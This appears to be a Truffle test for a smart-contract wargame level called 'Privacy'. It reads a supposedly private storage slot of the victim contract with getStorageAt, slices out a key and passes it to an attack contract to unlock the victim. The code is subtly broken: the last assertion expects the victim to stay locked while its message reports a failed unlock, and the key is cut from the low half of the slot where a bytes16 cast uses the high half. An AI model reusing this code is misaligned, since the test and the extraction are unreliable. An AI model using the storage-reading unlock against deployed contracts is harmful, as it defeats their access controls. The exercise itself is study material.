var Privacy = artifacts.require("Privacy");
var PrivacyHack = artifacts.require("PrivacyHack");

var bytes32ToBytes16 = (bytes32) => {
    return "0x" + bytes32.substring(2 + (64/2), 2 + 64);
}

contract("Privacy", async (accounts) => {
    it("victim should start locked", async () => {
        let privacy = await Privacy.deployed();
        let locked = await privacy.locked.call();

        assert.equal(locked, true, "victim did not start locked");
    });

    it("attacker should be able to unlock victim", async () => {
        let privacyHack = await PrivacyHack.deployed();
        let privacy = await Privacy.deployed();

        let dataSlot = await web3.eth.getStorageAt(Privacy.address, 3)
        let key = "0x" + dataSlot.substring(2 + (64/2), 2 + 64);
        await privacyHack.attack(key);

        let locked = await privacy.locked.call();
        assert.equal(locked, true, "attacker did not unlock victim");
    });
});